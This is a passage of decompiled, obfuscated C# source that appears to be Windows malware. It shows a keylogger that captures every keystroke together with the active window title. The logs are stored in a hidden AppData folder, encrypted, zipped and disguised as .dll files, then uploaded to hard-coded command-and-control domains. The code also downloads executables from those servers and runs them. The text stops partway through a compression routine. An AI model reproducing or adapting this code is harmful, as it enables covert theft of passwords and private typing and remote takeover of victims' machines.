using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using fcvgybhunjimkjnhubgyvtfc.My;
using fcvgybhunjimkjnhubgyvtfc.My.Resources;

namespace fcvgybhunjimkjnhubgyvtfc;

[StandardModule]
internal sealed class Module2
{
	public class dcefrghtbvefcgvrtdscfvgrbtnhrbgefvrnthdfghnfbegrthgrfewgtsdefvgrbtgvfcd
	{
		private XElement xmlEkeys;

		private long xmlEkeysSize;

		private XElement xmlEkeysChild;

		private KeysConverter k;

		private int key;

		public bool con;

		private bool lastSpecKey;

		private bool busy;

		private int elCo;

		private StreamWriter file_temp;

		private string current_file_name;

		[field: AccessedThroughProperty("Timer1")]
		private virtual Timer Timer1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vKey);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

		public dcefrghtbvefcgvrtdscfvgrbtnhrbgefvrnthdfghnfbegrthgrfewgtsdefvgrbtgvfcd()
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected O, but got Unknown
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Expected O, but got Unknown
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			//IL_004e: Expected O, but got Unknown
			xmlEkeys = new XElement(XName.op_Implicit("content"));
			xmlEkeysSize = 0L;
			xmlEkeysChild = null;
			k = new KeysConverter();
			con = true;
			Timer1 = new Timer();
			lastSpecKey = false;
			busy = false;
			elCo = 0;
			current_file_name = "";
			bufferInit();
			Timer1.set_Interval(1);
			Timer1.set_Enabled(true);
			Timer1.add_Tick((EventHandler)Timer1_Tick);
			Timer1.Start();
		}

		public void output()
		{
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(((XNode)xmlEkeys).ToString());
		}

		public void bufferInit(bool background = false)
		{
			//IL_0095: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Expected O, but got Unknown
			//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b0: Expected O, but got Unknown
			if (background)
			{
				conState.balance();
				string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name(), "*.temp");
				foreach (string text in files)
				{
					if (Operators.CompareString(text, current_file_name, false) == 0)
					{
						continue;
					}
					try
					{
						string text2 = File.ReadAllText(text);
						if (text2.Length >= 2)
						{
							XElement val = XElement.Parse("<bufferTemp>" + text2 + "</bufferTemp>");
							((XContainer)val).Add((object)new XElement(XName.op_Implicit("startup"), (object)"i am"));
							XElement val2 = new XElement(XName.op_Implicit("blackBox"));
							((XContainer)val2).Add((object)val);
							((XContainer)val2).Add((object)curHost.getData());
							new secure().prepareForUpload(val2);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						File.Delete(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			else
			{
				conState.balance();
				string path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + "\\"), controlState.RandomString(10)), (object)".temp"));
				while (File.Exists(path))
				{
					path = Conversions.ToString(Operators.ConcatenateObject(controlState.RandomString(10), (object)".temp"));
				}
				current_file_name = path;
				file_temp = new StreamWriter(path);
				file_temp.Write("");
				file_temp.Flush();
			}
		}

		public void timeout()
		{
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("timeout ********************");
		}

		public long keySize(bool complete = false)
		{
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Expected O, but got Unknown
			try
			{
				object objLock = Module2.objLock;
				ObjectFlowControl.CheckForSyncLockOnValueType(objLock);
				bool lockTaken = false;
				try
				{
					Monitor.Enter(objLock, ref lockTaken);
					if (complete)
					{
						if (xmlEkeysChild.get_Value().Length > 7)
						{
							((XContainer)xmlEkeys).Add((object)xmlEkeysChild);
						}
						xmlEkeysChild = new XElement(XName.op_Implicit("app"));
					}
					if (((XContainer)xmlEkeys).Descendants(XName.op_Implicit("app")).Count() > 0)
					{
						file_temp.Write(((XNode)xmlEkeys).ToString().Replace("<content>", "").Replace("</content>", ""));
						elCo += ((XContainer)xmlEkeys).Descendants(XName.op_Implicit("app")).Count();
						xmlEkeys.RemoveAll();
						file_temp.Flush();
					}
					actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("data 2   -----  " + Conversions.ToString(((XContainer)xmlEkeys).Descendants(XName.op_Implicit("app")).Count()));
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(objLock);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return xmlEkeysSize;
		}

		public int countElement()
		{
			return elCo;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			int num = 1;
			do
			{
				key = 0;
				key = GetAsyncKeyState(num);
				if (key == -32767)
				{
					if (!con)
					{
						break;
					}
					string caption = GetCaption();
					string text = ((TypeConverter)(object)k).ConvertToString((object?)num);
					if (text.Length == 1)
					{
						lastSpecKey = false;
						if (Control.IsKeyLocked((Keys)20))
						{
							writeKeyXml(caption, text.ToUpper());
						}
						else
						{
							writeKeyXml(caption, text.ToLower());
						}
					}
					else if (!lastSpecKey)
					{
						lastSpecKey = true;
						writeKeyXml(caption, "[" + text.ToUpper() + "]");
					}
				}
				num++;
			}
			while (num <= 255);
		}

		public void writeKeyXml(string appTitle, string Key)
		{
			//IL_0106: Unknown result type (might be due to invalid IL or missing references)
			//IL_0110: Expected O, but got Unknown
			//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
			//IL_01af: Expected O, but got Unknown
			int num = 1;
			while (busy)
			{
				NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.DivideObject(controlState.errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg, (object)3) }, (string[])null, (Type[])null, (bool[])null, true);
				num++;
				if (num > 100)
				{
					busy = false;
				}
			}
			string text = "app";
			xmlEkeysSize += Key.Length;
			if (!Information.IsNothing((object)xmlEkeysChild))
			{
				if (xmlEkeysChild.get_HasAttributes())
				{
					if (Operators.CompareString(xmlEkeysChild.Attribute(XName.op_Implicit("currentApp")).get_Value(), appTitle, false) == 0)
					{
						xmlEkeysChild.set_Value(xmlEkeysChild.get_Value() + Key);
					}
					else
					{
						busy = true;
						if (xmlEkeysChild.get_Value().Length > 7)
						{
							((XContainer)xmlEkeys).Add((object)xmlEkeysChild);
						}
						busy = false;
						xmlEkeysChild = new XElement(XName.op_Implicit(text));
						xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
						xmlEkeysChild.set_Value(Key);
						xmlEkeysChild.SetAttributeValue(XName.op_Implicit("time"), (object)DateTime.Now.ToString());
						actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("-----------------------------start main-------------------------------");
						actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(((XNode)xmlEkeys).ToString());
						actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("-----------------------------end main-------------------------------");
					}
				}
				else
				{
					xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
					xmlEkeysChild.set_Value(Key);
				}
			}
			else
			{
				xmlEkeysChild = new XElement(XName.op_Implicit(text));
				xmlEkeysChild.SetAttributeValue(XName.op_Implicit("currentApp"), (object)appTitle);
				xmlEkeysChild.set_Value(Key);
				xmlEkeysChild.SetAttributeValue(XName.op_Implicit("time"), (object)DateTime.Now.ToString());
			}
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("-----------------------------start child-------------------------------");
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(((XNode)xmlEkeysChild).ToString());
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("-----------------------------end child-------------------------------");
		}

		public XElement rotate()
		{
			keySize(complete: true);
			try
			{
				file_temp.Close();
				XElement result = XElement.Parse("<bufferTemp>" + File.ReadAllText(current_file_name) + "</bufferTemp>");
				busy = true;
				File.Delete(current_file_name);
				bufferInit();
				busy = false;
				elCo = 0;
				xmlEkeysSize = 0L;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				XElement result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private string GetCaption()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			GetWindowText(GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}
	}

	public class controlState
	{
		private Random rand;

		private object netCount;

		private object isHostCon;

		private Ping pn;

		private object pingingHost;

		private object server;

		private WebRequest objWebReq;

		private WebResponse objResp;

		public static long dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd = 1801800L;

		public static object errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = 1001;

		public static object wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww = 60001;

		public static object ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt = 100001;

		public static object debug = false;

		public static object launch = false;

		public static object writingBusy = false;

		[SpecialName]
		private static Random _0024STATIC_0024GetRandom_002402888_0024Generator;

		[SpecialName]
		private static StaticLocalInitFlag _0024STATIC_0024GetRandom_002402888_0024Generator_0024Init;

		[SpecialName]
		private static Random _0024STATIC_0024RandomString_0024011C8_0024r;

		[SpecialName]
		private static StaticLocalInitFlag _0024STATIC_0024RandomString_0024011C8_0024r_0024Init;

		public controlState()
		{
			rand = new Random();
			netCount = 10;
			isHostCon = true;
			pn = new Ping();
			pingingHost = "http://google.com?,http://microsoft.com,http://facebook.com,http://yahoo.com,http://twitter.com";
			server = "http://kayumba.us.to?,http://kayumbaamback.us.to?,http://kayumbaambackagain.us.to?,http://asdfghjklasdfghjk.info?,http://qwertyuiopqwertyuiop.net,http://kayumbaforthelasttime.net";
		}

		public void debuging()
		{
			dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd = 5005L;
			ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt = 40;
			debug = true;
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("debuging");
		}

		public void launcher()
		{
			dcwftrhnrfvecdwefrhntbenthryjmtnhfvewerhtnehefvd = 5005L;
			ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt = 40;
			debug = true;
			launch = true;
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("launching");
		}

		public void local()
		{
			pingingHost = "http://localhost,http://localhost";
			server = "http://localhost?,http://localhost1?";
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("local");
		}

		public void balance()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name();
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path).Attributes = FileAttributes.Hidden;
			}
		}

		public bool state()
		{
			return Conversions.ToBoolean(isHostCon);
		}

		public Collection validServerUrl(string str = "")
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebClient webClient = new WebClient();
			int num = 0;
			Collection val = new Collection();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(server, (Type)null, "Split", new object[1] { "," }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					num = rand.Next(100, 10001);
					try
					{
						Thread.Sleep(101);
						object? objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue, (object)"?token=true&"), RandomString(5)), (object)"="), (object)num), (object)str) }, (string[])null, (Type[])null, (bool[])null));
						actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"available- ", objectValue), (object)"?token=true&"), RandomString(5)), (object)"="), (object)num)));
						if (Conversions.ToBoolean(secure.fgrbthbewdxfgvrbdwxfgvrhbtgvrdcewxfvrgbthgvfrdcwxcefgvrtgcedcevrbtrgdcxwcefvrbtgcd(Conversions.ToString(objectValue2))))
						{
							actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"valid token- ", objectValue), (object)"?token=true&"), RandomString(5)), (object)"="), (object)num)));
							val.Add(RuntimeHelpers.GetObjectValue(objectValue), (string)null, (object)null, (object)null);
						}
						else
						{
							Thread.Sleep(101);
							actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"invalid token- ", objectValue), (object)"?token=true&"), RandomString(5)), (object)"="), (object)num)));
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				return val;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public bool isHostConnected()
		{
			if (Operators.ConditionalCompareObjectGreaterEqual(netCount, (object)10, false))
			{
				netCount = 0;
				string[] array = pingingHost.ToString()!.Split(new char[1] { ',' });
				string requestUriString = array.ElementAt(GetRandom(0, array.Length));
				objWebReq = WebRequest.Create(requestUriString);
				objWebReq.Proxy = null;
				try
				{
					Type typeFromHandle = typeof(Thread);
					object[] obj = new object[1] { errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg };
					object[] array2 = obj;
					bool[] obj2 = new bool[1] { true };
					bool[] array3 = obj2;
					NewLateBinding.LateCall((object)null, typeFromHandle, "Sleep", obj, (string[])null, (Type[])null, obj2, true);
					if (array3[0])
					{
						errrrrrrrrrrrrrrrrrrrrrrrrrrrrgggggggggggggggggggggggg = RuntimeHelpers.GetObjectValue(array2[0]);
					}
					objResp = objWebReq.GetResponse();
					objResp.Close();
					objWebReq = null;
					isHostCon = true;
					return true;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					isHostCon = false;
					objWebReq = null;
					bool result = false;
					ProjectData.ClearProjectError();
					return result;
				}
			}
			netCount = Operators.AddObject(netCount, (object)1);
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(Conversions.ToString(Operators.ConcatenateObject((object)"count", netCount)));
			return Conversions.ToBoolean(isHostCon);
		}

		public static int GetRandom(int Min, int Max)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected O, but got Unknown
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			if (_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init == null)
			{
				Interlocked.CompareExchange(ref _0024STATIC_0024GetRandom_002402888_0024Generator_0024Init, new StaticLocalInitFlag(), null);
			}
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init, ref lockTaken);
				if (_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State == 0)
				{
					_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State = 2;
					_0024STATIC_0024GetRandom_002402888_0024Generator = new Random();
				}
				else if (_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024GetRandom_002402888_0024Generator_0024Init);
				}
			}
			return _0024STATIC_0024GetRandom_002402888_0024Generator.Next(Min, Max);
		}

		public static object RandomString(int len)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_005c: Unknown result type (might be due to invalid IL or missing references)
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			if (_0024STATIC_0024RandomString_0024011C8_0024r_0024Init == null)
			{
				Interlocked.CompareExchange(ref _0024STATIC_0024RandomString_0024011C8_0024r_0024Init, new StaticLocalInitFlag(), null);
			}
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024RandomString_0024011C8_0024r_0024Init, ref lockTaken);
				if (_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State == 0)
				{
					_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State = 2;
					_0024STATIC_0024RandomString_0024011C8_0024r = new Random();
				}
				else if (_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024RandomString_0024011C8_0024r_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024RandomString_0024011C8_0024r_0024Init);
				}
			}
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= len; i++)
			{
				int startIndex = _0024STATIC_0024RandomString_0024011C8_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			return stringBuilder.ToString();
		}

		public static long getTimeStamp()
		{
			try
			{
				return (long)Math.Round(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999800");
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static long getTimeStampDate(DateTime dt)
		{
			try
			{
				return (long)Math.Round(dt.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static long getTimeStamp(int addDays)
		{
			try
			{
				return (long)Math.Round(DateTime.UtcNow.AddDays(addDays).Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999900");
				long result = 0L;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public class networkUpload
	{
		public network net;

		public bool discard;

		private int iC;

		public networkUpload()
		{
			net = default(network);
			discard = false;
			iC = 0;
			net.FILE_NAME = "";
			net.server = conState.validServerUrl();
		}

		public void upload(string file)
		{
			iC++;
			if (iC > 5)
			{
				discard = true;
				iC = 0;
				return;
			}
			if (!Information.IsNothing((object)net.server) & (net.server.get_Count() > 0))
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = net.server.GetEnumerator();
					while (enumerator.MoveNext())
					{
						string url = Conversions.ToString(enumerator.Current);
						net.statusCode = 0;
						net.FILE_NAME = file;
						if (!uploadFile(url))
						{
							uploadFile(url);
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				clean();
			}
			else
			{
				net.server = conState.validServerUrl();
			}
			actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("sent for upload");
		}

		public void clean()
		{
			try
			{
				File.Delete(net.FILE_NAME);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999910");
				ProjectData.ClearProjectError();
			}
		}

		public object ready()
		{
			return net.ready;
		}

		private bool uploadFile(string url)
		{
			try
			{
				if (!((net.statusCode != 0) | (net.FILE_NAME.Length < 1)))
				{
					byte[] bytes = new WebClient().UploadFile(new Uri(url), net.FILE_NAME);
					try
					{
						if (Operators.CompareString(Encoding.ASCII.GetString(bytes), "gotyou", false) == 0)
						{
							return true;
						}
						return false;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						if (Conversions.ToBoolean(controlState.debug))
						{
							try
							{
								actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(ex2.Message + "0x999930");
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
						}
						bool result = false;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return false;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				try
				{
					if (Conversions.ToBoolean(controlState.debug))
					{
						actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(ex4.Message + "0x999920");
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public struct network
	{
		public string FILE_NAME;

		public int statusCode;

		public bool ready;

		public Collection server;
	}

	public class networkDownload
	{
		private network net;

		public networkDownload()
		{
			net = default(network);
		}

		public XElement downloadString()
		{
			WebClient webClient = new WebClient();
			new secure();
			CurrentHost currentHost = new CurrentHost();
			net.server = conState.validServerUrl();
			if (!Information.IsNothing((object)net.server))
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = net.server.GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text = Conversions.ToString(enumerator.Current);
						try
						{
							string text2 = webClient.DownloadString(new Uri(text + "?link=" + currentHost.getHostLink() + "neew"));
							if (text2.Length <= 5)
							{
								continue;
							}
							try
							{
								string text3 = "";
								text3 = ((!Operators.ConditionalCompareObjectEqual(controlState.debug, (object)false, false)) ? text2 : secure.AES_Decrypt(text2, currentHost.getHostIdentity()));
								actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("download  " + text3);
								if (!Information.IsNothing((object)text3))
								{
									return XElement.Parse(text3);
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("");
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999940");
							actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh(ex2.Message);
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			return null;
		}

		public bool downloadFileExe(string url, string command)
		{
			WebClient webClient = new WebClient();
			string temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
			object obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(temp + "\\"), controlState.RandomString(20)), (object)".exe");
			while (File.Exists(Conversions.ToString(obj)))
			{
				obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)(temp + "\\"), controlState.RandomString(20)), (object)".exe");
			}
			try
			{
				webClient.DownloadFile(new Uri(url), Conversions.ToString(obj));
				try
				{
					if (File.Exists(Conversions.ToString(obj)))
					{
						Process.Start(Conversions.ToString(obj), command);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				return true;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999950");
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public class secure
	{
		private object dataFolder;

		public secure()
		{
			dataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + ((ServerComputer)MyProject.Computer).get_Name();
			if (!Directory.Exists(Conversions.ToString(dataFolder)))
			{
				Directory.CreateDirectory(Conversions.ToString(dataFolder)).Attributes = FileAttributes.NotContentIndexed;
			}
		}

		public object prepareForUpload(XElement data)
		{
			controlState.writingBusy = true;
			try
			{
				string path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dataFolder, (object)"\\"), controlState.RandomString(20)), (object)".dll"));
				while (File.Exists(path))
				{
					path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(dataFolder, (object)"\\"), controlState.RandomString(20)), (object)".dll"));
				}
				StreamWriter streamWriter = new StreamWriter(path, append: false);
				string text = "";
				text = encryptToXml(data);
				if (text.Length > 3)
				{
					try
					{
						text = Zip(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					streamWriter.Write(text);
					streamWriter.Close();
					controlState.writingBusy = false;
					return true;
				}
				controlState.writingBusy = false;
				return false;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				controlState.writingBusy = false;
				actions.dsefrgthgbrfvefnhtjrmkjnyhtbgrvfgthyjmkyymjyhtg5yh6uj7ik8ij7uhy6gt54y6ju7k8lkujmynhtrgthyjukjuuyh("0x999970");
				Console.Write(ex2.Message);
				object result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string Zip(string text)
		{
			byte[] bytes = Encoding.Unicode.GetBytes(text);
			MemoryStream memoryStream = new MemoryStream();
